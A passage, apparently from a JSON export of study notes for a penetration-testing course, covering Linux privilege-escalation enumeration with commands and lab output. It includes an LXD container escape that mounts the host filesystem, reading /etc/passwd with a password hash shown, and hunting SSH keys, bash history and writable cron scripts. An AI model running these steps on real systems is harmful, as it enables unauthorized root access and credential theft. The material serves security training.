  | Compiled a shared libary                              |\n| `lxd init`                                                                          | Start the LXD initialization process                  |\n| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | Import a local image                                  |\n| `lxc init alpine r00t -c security.privileged=true`                                  | Start a privileged LXD container                      |\n| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | Mount the host file system in a container             |\n| `lxc start r00t`                                                                    | Start the container                                   |\n| `showmount -e 10.129.2.12`                                                          | Show the NFS export list                              |\n| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | Mount an NFS share locally                            |\n| `tmux -S /shareds new -s debugsess`                                                 | Created a shared `tmux` session socket                |\n| `./lynis audit system`                                                              | Perform a system audit with `Lynis`                   |",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/02-Introduction to Linux Privilege Escalation",
    "path": "02_CPTS/16-Linux Privilege Escalation/02-Introduction to Linux Privilege Escalation.md",
    "title": "02 Introduction To Linux Privilege Escalation",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- The root account on Linux systems provides full administrative level access to the operating system. During an assessment, you may gain a low-privileged shell on a Linux host and need to perform p...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nThe root account on Linux systems provides full administrative level access to the operating system. During an assessment, you may gain a low-privileged shell on a Linux host and need to perform privilege escalation to the root account. Fully compromising the host would allow us to capture traffic and access sensitive files, which may be used to further access within the environment. Additionally, if the Linux machine is domain joined, we can gain the NTLM hash and begin enumerating and attacking Active Directory.\n\n---\n\n## Enumeration\n\nEnumeration is the key to privilege escalation. Several helper scripts (such as [LinEnum](https://github.com/rebootuser/LinEnum)) exist to assist with enumeration. Still, it is also important to understand what pieces of information to look for and to be able to perform your enumeration manually. When you gain initial shell access to the host, it is important to check several key details.\n\n`OS Version`: Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.\n\n`Kernel Version`: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.\n\n`Running Services`: Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE-2016-9566, a local privilege escalation flaw in Nagios Core < 4.2.4.\n\n#### List Current Processes\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ ps aux | grep root\n\nroot         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/init\nroot         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]\nroot         3  0.0  0.0      0     0 ?        S    23:26   0:00 [ksoftirqd/0]\nroot         4  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/0:0]\nroot         5  0.0  0.0      0     0 ?        S<   23:26   0:00 [kworker/0:0H]\nroot         6  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/u8:0]\nroot         7  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_sched]\nroot         8  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_bh]\nroot         9  0.0  0.0      0     0 ?        S    23:26   0:00 [migration/0]\n\n<SNIP>\n```\n\n`Installed Packages and Versions`: Like running services, it is important to check for any out-of-date or vulnerable packages that may be easily leveraged for privilege escalation. An example is Screen, which is a common terminal multiplexer (similar to tmux). It allows you to start a session and open many windows or virtual terminals instead of opening multiple terminal sessions. Screen version 4.05.00 suffers from a privilege escalation vulnerability that can be easily leveraged to escalate privileges.\n\n`Logged in Users`: Knowing which other users are logged into the system and what they are doing can give greater into possible local lateral movement and privilege escalation paths.\n\n#### List Current Processes\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ ps au\n\nUSER       \t\tPID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot      \t\t1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --\ncliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bash\nshared     \t\t1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bash\nroot      \t\t1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo su\nroot      \t\t1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 su\nroot      \t\t1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bash\nshared     \t\t1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au\n```\n\n`User Home Directories`: Are other user's home directories accessible? User home folders may also contain SSH keys that can be used to access other systems or scripts and configuration files containing credentials. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment.\n\n#### Home Directory Contents\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls /home\n\nbackupsvc  bob.jones  cliff.moore  logger  mrb3n  shared  stacey.jenkins\n```\n\nWe can check individual user directories and check to see if files such as the `.bash_history` file are readable and contain any interesting commands, look for configuration files, and check to see if we can obtain copies of a user's SSH keys.\n\n#### User's Home Directory Contents\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -la /home/stacey.jenkins/\n\ntotal 32\ndrwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .\ndrwxr-xr-x 9 root           root           4096 Aug 30 23:33 ..\n-rw------- 1 stacey.jenkins stacey.jenkins   41 Aug 30 23:35 .bash_history\n-rw-r--r-- 1 stacey.jenkins stacey.jenkins  220 Sep  1  2015 .bash_logout\n-rw-r--r-- 1 stacey.jenkins stacey.jenkins 3771 Sep  1  2015 .bashrc\n-rw-r--r-- 1 stacey.jenkins stacey.jenkins   97 Aug 30 23:37 config.json\n-rw-r--r-- 1 stacey.jenkins stacey.jenkins  655 May 16  2017 .profile\ndrwx------ 2 stacey.jenkins stacey.jenkins 4096 Aug 30 23:35 .ssh\n```\n\nIf you find an SSH key for your current user, this could be used to open an SSH session on the host (if SSH is exposed externally) and gain a stable and fully interactive session. SSH keys could be leveraged to access other systems within the network as well. At the minimum, check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys.\n\n#### SSH Directory Contents\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -l ~/.ssh\n\ntotal 8\n-rw------- 1 mrb3n mrb3n 1679 Aug 30 23:37 id_rsa\n-rw-r--r-- 1 mrb3n mrb3n  393 Aug 30 23:37 id_rsa.pub\n```\n\nIt is also important to check a user's bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more. Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.\n\n#### Bash History\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ history\n\n    1  id\n    2  cd /home/cliff.moore\n    3  exit\n    4  touch backup.sh\n    5  tail /var/log/apache2/error.log\n    6  ssh ec2-user@dmz02.inlanefreight.local\n    7  history\n```\n\n`Sudo Privileges`: Can the user run any commands either as another user or as root? If you do not have credentials for the user, it may not be possible to leverage sudo permissions. However, often sudoer entries include `NOPASSWD`, meaning that the user can run the specified command without being prompted for a password. Not all commands, even we can run as root, will lead to privilege escalation. It is not uncommon to gain access as a user with full sudo privileges, meaning they can run any command as root. Issuing a simple `sudo su` command will immediately give you a root session.\n\n#### Sudo - List User's Privileges\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo -l\n\nMatching Defaults entries for sysadm on NIX02:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser sysadm may run the following commands on NIX02:\n    (root) NOPASSWD: /usr/sbin/tcpdump\n```\n\n`Configuration Files`: Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as `.conf` and `.config`, for usernames, passwords, and other secrets.\n\n`Readable Shadow File`: If the shadow file is readable, you will be able to gather password hashes for all users who have a password set. While this does not guarantee further access, these hashes can be subjected to an offline brute-force attack to recover the cleartext password.\n\n`Password Hashes in /etc/passwd`: Occasionally, you will see password hashes directly in the /etc/passwd file. This file is readable by all users, and as with hashes in the `shadow` file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.\n\n#### Passwd\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n<...SNIP...>\ndnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false\nsshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin\nmrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash\ncolord:x:111:118:colord colour management daemon,,,:/var/lib/colord:/bin/false\nbackupsvc:x:1001:1001::/home/backupsvc:\nbob.jones:x:1002:1002::/home/bob.jones:\ncliff.moore:x:1003:1003::/home/cliff.moore:\nlogger:x:1004:1004::/home/logger:\nshared:x:1005:1005::/home/shared:\nstacey.jenkins:x:1006:1006::/home/stacey.jenkins:\nsysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm:\n```\n\n`Cron Jobs`: Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.\n\n#### Cron Jobs\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -la /etc/cron.daily/\n\ntotal 60\ndrwxr-xr-x  2 root root 4096 Aug 30 23:49 .\ndrwxr-xr-x 93 root root 4096 Aug 30 23:47 ..\n-rwxr-xr-x  1 root root  376 Mar 31  2016 apport\n-rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat\n-rwx--x--x  1 root root  379 Aug 30 23:49 backup\n-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils\n-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg\n-rwxr-xr-x  1 root root  372 May  6  2015 logrotate\n-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db\n-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm\n-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate\n-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd\n-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder\n-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest\n-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common\n```\n\n`Unmounted File Systems and Additional Drives`: If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.\n\n#### File Systems & Additional Drives\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ lsblk\n\nNAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT\nsda      8:0    0   30G  0 disk \n├─sda1   8:1    0   29G  0 part /\n├─sda2   8:2    0    1K  0 part \n└─sda5   8:5    0  975M  0 part [SWAP]\nsr0     11:0    1  848M  0 rom  \n```\n\n`SETUID and SETGID Permissions`: Binaries are set with these permissions to allow a user to run a command as root, without having to grant root-level access to the user. Many binaries contain functionality that can be exploited to get a root shell.\n\n`Writeable Directories`: It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.\n\n#### Find Writable Directories\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null\n\n/dmz-backups\n/tmp\n/tmp/VMwareDnD\n/tmp/.XIM-unix\n/tmp/.Test-unix\n/tmp/.X11-unix\n/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp\n/tmp/.font-unix\n/tmp/.ICE-unix\n/proc\n/dev/mqueue\n/dev/shm\n/var/tmp\n/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp\n/var/crash\n/run/lock\n```\n\n`Writeable Files`: Are any scripts or configuration files world-writable? While altering configuration files can be extremely destructive, there may be instances where a minor modification can open up further access. Also, any scripts that are run as root using cron jobs can be modified slightly to append a command.\n\n#### Find Writable Files\n\nIntroduction to Linux Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null\n\n/etc/cron.daily/backup\n/dmz-backups/backup.sh\n/proc\n/sys/fs/cgroup/memory/init.scope/cgroup.event_control\n\n<SNIP>\n\n/home/backupsvc/backup.sh\n\n<SNIP>\n```\n\n---\n\n## Moving on\n\nAs we have seen, there are various manual enumeration techniques that we can perform to gain information to inform various privilege escalation attacks. A variety of techniques exist that can be leveraged to perform local privilege escalation on Linux, which we will cover in the next sections.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/03-Environment Enumeration",
    "path": "02_CPTS/16-Linux Privilege Escalation/03-Environment Enumeration.md",
    "title": "03 Environment Enumeration",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Enumeration is the key to privilege escalation. Several helper scripts (such as LinPEAS and LinEnum) exist to assist with enumeration. Still, it is also important to understand what pieces of informat...",
    "category": "02_CPTS",
    "content": "Enumeration is the key to privilege escalation. Several helper scripts (such as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and [LinEnum](https://github.com/rebootuser/LinEnum)) exist to assist with enumeration. Still, it is also important to understand what pieces of information to look for and to be able to perform your enumeration manually. When you gain initial shell access to the host, it is important to check several key details.\n\n`OS Version`: Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.\n\n`Kernel Version`: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.\n\n`Running Services`: Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE-2016-9566, a local privilege escalation flaw in Nagios Core < 4.2.4.\n\n---\n\n## Gaining Situational Awareness\n\nLet's say we have just gained access to a Linux host by exploiting an unrestricted file upload vulnerability during an External Penetration Test. After establishing our reverse shell (and ideally some sort of persistence), we should start by gathering some basics about the system we are working with.\n\nFirst, we'll answer the fundamental question: What operating system are we dealing with? If we landed on a CentOS host or Red Hat Enterprise Linux host, our enumeration would likely be slightly different than if we landed on a Debian-based host such as Ubuntu. If we land on a host such as FreeBSD, Solaris, or something more obscure such as the HP proprietary OS HP-UX or the IBM OS AIX, the commands we would work with will likely be different. Though the commands may be different, and we may even need to look up a command reference in some instances, the principles are the same. For our purposes, we'll begin with an Ubuntu target to cover general tactics and techniques. Once we learn the basics and combine them with a new way of thinking and the stages of the Penetration Testing Process, it shouldn't matter what type of Linux system we land on because we'll have a thorough and repeatable process.\n\nThere are many cheat sheets out there to help with enumerating Linux systems and some bits of information we are interested in will have two or more ways to obtain it. In this module we'll cover one methodology that can likely be used for the majority of Linux systems that we encounter in the wild. That being said, make sure you understand what the commands are doing and how to tweak them or find the information you need a different way if a particular command doesn't work. Challenge yourself during this module to try things various ways to practice your methodology and what works best for you. Anyone can re-type commands from a cheat sheet but a deep understanding of what you are looking for and how to obtain it will help us be successful in any environment.\n\nTypically we'll want to run a few basic commands to orient ourselves:\n\n- `whoami` - what user are we running as\n- `id` - what groups does our user belong to?\n- `hostname` - what is the server named, can we gather anything from the naming convention?\n- `ifconfig` or `ip a` - what subnet did we land in, does the host have additional NICs in other subnets?\n- `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like `sudo su` and drop right into a root shell.\n\nIncluding screenshots of the above information can be helpful in a client report to provide evidence of a successful Remote Code Execution (RCE) and to clearly identify the affected system. Now let's get into our more detailed, step-by-step, enumeration.\n\nWe'll start out by checking out what operating system and version we are dealing with.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/os-release\n\nNAME=\"Ubuntu\"\nVERSION=\"20.04.4 LTS (Focal Fossa)\"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=\"Ubuntu 20.04.4 LTS\"\nVERSION_ID=\"20.04\"\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nVERSION_CODENAME=focal\nUBUNTU_CODENAME=focal\n```\n\nWe can see that the target is running [Ubuntu 20.04.4 LTS (\"Focal Fossa\")](https://releases.ubuntu.com/20.04/). For whatever version we encounter its important to see if we're dealing with something out-of-date or maintained. Ubuntu publishes its [release cycle](https://ubuntu.com/about/release-cycle) and from this we can see that \"Focal Fossa\" does not reach end of life until April 2030. From this information we can assume that we will not encounter a well-known Kernel vulnerability because the customer has been keeping their internet-facing asset patched but we'll still look regardless.\n\nNext we'll want to check out our current user's PATH, which is where the Linux system looks every time a command is executed for any executables to match the name of what we type, i.e., `id` which on this system is located at `/usr/bin/id`. As we'll see later in this module, if the PATH variable for a target user is misconfigured we may be able to leverage it to escalate privileges. For now we'll note it down and add it to our notetaking tool of choice.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ echo $PATH\n\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n```\n\nWe can also check out all environment variables that are set for our current user, we may get lucky and find something sensitive in there such as a password. We'll note this down and move on.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ env\n\nSHELL=/bin/bash\nPWD=/home/htb-student\nLOGNAME=htb-student\nXDG_SESSION_TYPE=tty\nMOTD_SHOWN=pam\nHOME=/home/htb-student\nLANG=en_US.UTF-8\n\n<SNIP>\n```\n\nNext let's note down the Kernel version. We can do some searches to see if the target is running a vulnerable Kernel (which we'll get to take advantage of later on in the module) which has some known public exploit PoC. We can do this a few ways, another way would be `cat /proc/version` but we'll use the `uname -a` command.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ uname -a\n\nLinux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\n```\n\nWe can next gather some additional information about the host itself such as the CPU type/version:\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ lscpu \n\nArchitecture:                    x86_64\nCPU op-mode(s):                  32-bit, 64-bit\nByte Order:                      Little Endian\nAddress sizes:                   43 bits physical, 48 bits virtual\nCPU(s):                          2\nOn-line CPU(s) list:             0,1\nThread(s) per core:              1\nCore(s) per socket:              2\nSocket(s):                       1\nNUMA node(s):                    1\nVendor ID:                       AuthenticAMD\nCPU family:                      23\nModel:                           49\nModel name:                      AMD EPYC 7302P 16-Core Processor\nStepping:                        0\nCPU MHz:                         2994.375\nBogoMIPS:                        5988.75\nHypervisor vendor:               VMware\n\n<SNIP>\n```\n\nWhat login shells exist on the server? Note these down and highlight that both Tmux and Screen are available to us.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/shells\n\n# /etc/shells: valid login shells\n/bin/sh\n/bin/bash\n/usr/bin/bash\n/bin/rbash\n/usr/bin/rbash\n/bin/dash\n/usr/bin/dash\n/usr/bin/tmux\n/usr/bin/screen\n```\n\nWe should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:\n\n- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)\n- [iptables](https://linux.die.net/man/8/iptables)\n- [AppArmor](https://apparmor.net/)\n- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)\n- [Fail2ban](https://github.com/fail2ban/fail2ban)\n- [Snort](https://www.snort.org/faq/what-is-snort)\n- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)\n\nOften we will not have the privileges to enumerate the configurations of these protections but knowing what, if any, are in place, can help us not to waste time on certain tasks.\n\nNext we can take a look at the drives and any shares on the system. First, we can use the `lsblk` command to enumerate information about block devices on the system (hard disks, USB drives, optical drives, etc.). If we discover and can mount an additional drive or unmounted file system, we may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ lsblk\n\nNAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT\nloop0                       7:0    0   55M  1 loop /snap/core18/1705\nloop1                       7:1    0   69M  1 loop /snap/lxd/14804\nloop2                       7:2    0   47M  1 loop /snap/snapd/16292\nloop3                       7:3    0  103M  1 loop /snap/lxd/23339\nloop4                       7:4    0   62M  1 loop /snap/core20/1587\nloop5                       7:5    0 55.6M  1 loop /snap/core18/2538\nsda                         8:0    0   20G  0 disk \n├─sda1                      8:1    0    1M  0 part \n├─sda2                      8:2    0    1G  0 part /boot\n└─sda3                      8:3    0   19G  0 part \n  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /\nsr0                        11:0    1  908M  0 rom \n```\n\nThe command `lpstat` can be used to find information about any printers attached to the system. If there are active or queued print jobs can we gain access to some sort of sensitive information?\n\nWe should also check for mounted drives and unmounted drives. Can we mount an umounted drive and gain access to sensitive data? Can we find any types of credentials in `fstab` for mounted drives by grepping for common words such as password, username, credential, etc in `/etc/fstab`?\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/fstab\n\n# /etc/fstab: static file system information.\n#\n# Use 'blkid' to print the universally unique identifier for a\n# device; this may be used with UUID= as a more robust way to name devices\n# that works even if disks are added and removed. See fstab(5).\n#\n# <file system> <mount point>   <type>  <options>       <dump>  <pass>\n# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation\n/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0\n# /boot was on /dev/sda2 during curtin installation\n/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0\n```\n\nCheck out the routing table by typing `route` or `netstat -rn`. Here we can see what other networks are available via which interface.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ route\n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\ndefault         _gateway        0.0.0.0         UG    0      0        0 ens192\n10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192\n```\n\nIn a domain environment we'll definitely want to check `/etc/resolv.conf` if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.\n\nWe'll also want to check the arp table to see what other hosts the target has been communicating with.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ arp -a\n\n_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192\n```\n\nThe environment enumeration also includes knowledge about the users that exist on the target system. This is because individual users are often configured during the installation of applications and services to limit the service's privileges. The reason for this is to maintain the security of the system itself. Because if a service is running with the highest privileges (`root`) and this is brought under control by an attacker, the attacker automatically has the highest rights over the entire system. All users on the system are stored in the `/etc/passwd` file. The format gives us some information, such as:\n\n1. Username\n2. Password\n3. User ID (UID)\n4. Group ID (GID)\n5. User ID info\n6. Home directory\n7. Shell\n\n#### Existing Users\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ntcpdump:x:108:115::/nonexistent:/usr/sbin/nologin\nmrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash\nbjones:x:1001:1001::/home/bjones:/bin/sh\nadministrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh\nbackupsvc:x:1003:1003::/home/backupsvc:/bin/sh\ncliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash\nlogger:x:1005:1005::/home/logger:/bin/sh\nshared:x:1006:1006::/home/shared:/bin/sh\nstacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash\nhtb-student:x:1008:1008::/home/htb-student:/bin/bash\n<SNIP>\n```\n\nOccasionally, we will see password hashes directly in the `/etc/passwd` file. This file is readable by all users, and as with hashes in the `/etc/shadow` file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/passwd | cut -f1 -d:\n\nroot\ndaemon\nbin\nsys\n\n...SNIP...\n\nmrb3n\nlxd\nbjones\nadministrator.ilfreight\nbackupsvc\ncliff.moore\nlogger\nshared\nstacey.jenkins\nhtb-student\n```\n\nWith Linux, several different hash algorithms can be used to make the passwords unrecognizable. Identifying them from the first hash blocks can help us to use and work with them later if needed. Here is a list of the most used ones:\n\n|**Algorithm**|**Hash**|\n|---|---|\n|Salted MD5|`$1$`...|\n|SHA-256|`$5$`...|\n|SHA-512|`$6$`...|\n|BCrypt|`$2a$`...|\n|Scrypt|`$7$`...|\n|Argon2|`$argon2i$`...|\n\nWe'll also want to check which users have login shells. Once we see what shells are on the system, we can check each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a `shellshock` exploit.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ grep \"sh$\" /etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\nmrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash\nbjones:x:1001:1001::/home/bjones:/bin/sh\nadministrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh\nbackupsvc:x:1003:1003::/home/backupsvc:/bin/sh\ncliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash\nlogger:x:1005:1005::/home/logger:/bin/sh\nshared:x:1006:1006::/home/shared:/bin/sh\nstacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash\nhtb-student:x:1008:1008::/home/htb-student:/bin/bash\n```\n\nEach user in Linux systems is assigned to a specific group or groups and thus receives special privileges. For example, if we have a folder named `dev` only for developers, a user must be assigned to the appropriate group to access that folder. The information about the available groups can be found in the `/etc/group` file, which shows us both the group name and the assigned user names.\n\n#### Existing Groups\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/group\n\nroot:x:0:\ndaemon:x:1:\nbin:x:2:\nsys:x:3:\nadm:x:4:syslog,htb-student\ntty:x:5:syslog\ndisk:x:6:\nlp:x:7:\nmail:x:8:\nnews:x:9:\nuucp:x:10:\nman:x:12:\nproxy:x:13:\nkmem:x:15:\ndialout:x:20:\nfax:x:21:\nvoice:x:22:\ncdrom:x:24:htb-student\nfloppy:x:25:\ntape:x:26:\nsudo:x:27:mrb3n,htb-student\naudio:x:29:pulse\ndip:x:30:htb-student\nwww-data:x:33:\n...SNIP...\n```\n\nThe `/etc/group` file lists all of the groups on the system. We can then use the [getent](https://man7.org/linux/man-pages/man1/getent.1.html) command to list members of any interesting groups.\n\nEnvironment Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ getent group sudo\n\nsudo:x:27:mrb3n\n```\n\nWe can also check out which users have a folder under the `/home` directory. We'll want to enumerate each of these to see if any of the system users are storing any sensitive data, files containing passwords. We 